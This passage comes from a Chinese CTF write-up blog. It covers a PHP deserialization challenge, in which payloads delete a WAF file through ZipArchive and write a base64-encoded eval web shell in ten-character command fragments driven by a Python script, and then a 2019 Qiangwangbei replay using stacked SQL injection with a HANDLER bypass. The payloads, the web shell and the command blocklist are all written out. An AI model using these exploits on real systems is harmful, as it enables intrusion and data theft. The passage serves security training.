class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;   <span class="comment">//admin</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice=<span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;choice-&gt;checking(<span class="keyword">$this</span>-&gt;username,<span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file-&gt;open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);    <span class="comment">//终点</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(md5(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])=== sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;     <span class="comment">//</span></span><br><span class="line">    @unserialize(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>构造exp读取shell.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Game();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Open();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;register=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//$b=new login();</span></span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671Awn"><img src="https://z3.ax1x.com/2021/03/23/671Awn.png" alt="671Awn.png"></a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;login success you can to open shell file!</span><br></pre></td></tr></table></figure>



<p>可以看到必须删除掉waf.txt才能调用shell方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在这个地方花费了很长时间，一开始的思路是利用伪协议来操作文件，但是伪协议不能做到删除文件。后来想到可以利用同名方法，查php内置类的时候发现ZipArchive类有open方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file-&gt;open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671Eoq"><img src="https://z3.ax1x.com/2021/03/23/671Eoq.png" alt="671Eoq.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671ZF0"><img src="https://z3.ax1x.com/2021/03/23/671ZF0.md.png" alt="671ZF0.md.png"></a></p>
<p>构造删除文件exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Game();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> ZipArchive();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;content=ZipArchive::OVERWRITE;</span><br><span class="line"><span class="variable">$a</span>-&gt;register=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&#x27;waf.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//$b=new login();</span></span><br></pre></td></tr></table></figure>



<p>删除成功</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671eYV"><img src="https://z3.ax1x.com/2021/03/23/671eYV.md.png" alt="671eYV.md.png"></a></p>
<p>接下来可以调用shell方法了，限制长度为10位字符，可以采用追加内容的方式写入shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;login success you can to open shell file!</span><br></pre></td></tr></table></figure>



<p>为了防止出现&lt;?这种特殊字符，把内容先base64编码后再写入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&lt;?php eval($_GET[1]);</span><br><span class="line">echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</span><br></pre></td></tr></table></figure>





<p>把文件内容分割后写入到文件名中，因为写入时间顺序的原因所以需要把命令倒序写入，ls -t表示把文件名按照时间排序，把所有文件名写入到0这个文件中，然后sh 0执行echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php写入文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">w&gt;hp</span><br><span class="line">w&gt;1.p\\</span><br><span class="line">w&gt;d\&gt;\\</span><br><span class="line">w&gt;\ -\\</span><br><span class="line">w&gt;e64\\</span><br><span class="line">w&gt;bas\\</span><br><span class="line">w&gt;7\|\\</span><br><span class="line">w&gt;XSk\\</span><br><span class="line">w&gt;Fsx\\</span><br><span class="line">w&gt;dFV\\</span><br><span class="line">w&gt;kX0\\</span><br><span class="line">w&gt;bCg\\</span><br><span class="line">w&gt;XZh\\</span><br><span class="line">w&gt;AgZ\\</span><br><span class="line">w&gt;waH\\</span><br><span class="line">w&gt;PD9\\</span><br><span class="line">w&gt;o\ \\</span><br><span class="line">w&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671uSU"><img src="https://z3.ax1x.com/2021/03/23/671uSU.md.png" alt="671uSU.md.png"></a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Game();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Open();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;register=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;content=<span class="string">&#x27;w&gt;e64\\&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//$b=new login();</span></span><br></pre></td></tr></table></figure>



<p>命令有点长，写了个脚本利用，首先新建二十个php文件，修改content属性为对应的命令，然后生成payload再发起请求</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671KlF"><img src="https://z3.ax1x.com/2021/03/23/671KlF.md.png" alt="671KlF.md.png"></a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">    localurl=<span class="string">&#x27;http://localhost/ctf/1/%d.php&#x27;</span> %i</span><br><span class="line">    r=requests.get(localurl)</span><br><span class="line">    payload=r.text</span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line"></span><br><span class="line">    data=&#123;<span class="string">&#x27;unser&#x27;</span>:payload&#125;</span><br><span class="line">    r=requests.post(url=<span class="string">&#x27;http://cf614f52-155c-4be7-b52b-8ab7d0076465.node1.hackingfor.fun/?a[]=1&amp;b[]=2&#x27;</span>,data=data)</span><br><span class="line">    print(r.status_code)</span><br></pre></td></tr></table></figure>



<p>   拿到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cf614f52-155c-4be7-b52b-8ab7d0076465.node1.hackingfor.fun&#x2F;1.php?1&#x3D;system(%22cat%20&#x2F;flag%22); </span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671mWT"><img src="https://z3.ax1x.com/2021/03/23/671mWT.md.png" alt="671mWT.md.png"></a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-13T02:11:38.000Z" title="2021-03-13T02:11:38.000Z">2021-03-13</time>发表</span><span class="level-item"><time dateTime="2021-03-13T02:20:35.603Z" title="2021-03-13T02:20:35.603Z">2021-03-13</time>更新</span><span class="level-item">6 分钟读完 (大约964个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">2019强网杯web部分复现</a></h1><div class="content"><h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>堆叠注入</p>
<p>测试时发现过滤了一些函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);</span><br></pre></td></tr></table></figure>

<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAXY8.png" alt="6dAXY8.png"></p>
<p>查看数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show databases #</span><br></pre></td></tr></table></figure>

<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAqTP.png" alt="6dAqTP.png"></p>
<p>查看表名，发现两张表</p>
<p>1919810931114514</p>
<p>words</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;show tables from supersqli #</span><br></pre></td></tr></table></figure>

<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAqTP.png" alt="6dAqTP.png"></p>
<p>表1919810931114514中存在flag字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>

<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAjfS.png" alt="6dAjfS.png"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>使用handler绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;handler &#96;1919810931114514&#96; open;handler &#96;1919810931114514&#96; read first;handler &#96;1919810931114514&#96;close #</span><br></pre></td></tr></table></figure>

<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAzlQ.png" alt="6dAzlQ.png"></p>
<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>反序列化</p>
<p>注册用户</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAoyd.png" alt="6dAoyd.png"></p>
<p>进入后发现可以上传图片</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAbwt.png" alt="6dAbwt.png"></p>
<p>下载备份文件<a target="_blank" rel="noopener" href="http://www.tar.gz/">www.tar.gz</a></p>
<p>在cookie处发现序列化后的字符串，推测是要利用反序列化。</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAfJO.png" alt="6dAfJO.png"></p>
<p>全局搜索unserialize，定位到/web/controller/Index.php,从cookie中获取basse64编码后的user值然后进行反序列化</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dA2o6.png" alt="6dA2o6.png"></p>
